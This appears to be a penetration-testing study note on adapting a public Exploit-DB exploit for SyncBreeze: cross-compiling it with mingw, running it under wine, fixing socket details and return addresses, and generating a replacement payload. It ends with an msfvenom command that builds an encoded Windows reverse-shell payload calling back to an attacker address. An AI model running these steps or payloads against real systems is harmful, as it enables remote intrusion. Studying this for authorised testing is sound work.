# Fixing Exploits

Take note when searching for exploits whether it is a scripting language that requires an interpreter which may not be available. A stand-alone executable may be required. Never run an exploit without understanding the code.

Some C programs may include requirements to compile for Window (e.g. winsock2.h).  
`searchsploit - m 42341`  

### Cross Compile the Code
Cross compilation can be done on Kali. It is preferable to use native compilers, however not always possible.

`sudo apt install mingw-w64`  

`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` doesn't work. Googling the error:  
`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`

May also need to update for use of wine32 before we can run syncbreeze_exploit on Kali:
```bash
sudo dpkg --add-architecture i386

dpkg --print-foreign-architectures
# i386

sudo apt update
sudo apt install wine32 -y

wine syncbreeze_exploit.exe
```
### Change Socket Information
CHECK for hardcoded socket information, and change.

### Change the Return Address
Is it hardcoded from a DLL not currently in use? If a valid return address not known you could:
* Recreate target environment locally and use debugger.
* Try and find other publicly available exploits and leverage ones that match our target OS. Less Reliable.
* If we have access to target, we could copy the DLLs necessary or use tools such as dissasemblers of msfpescan to find a reliable return address.

### Change the payload.

`msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`


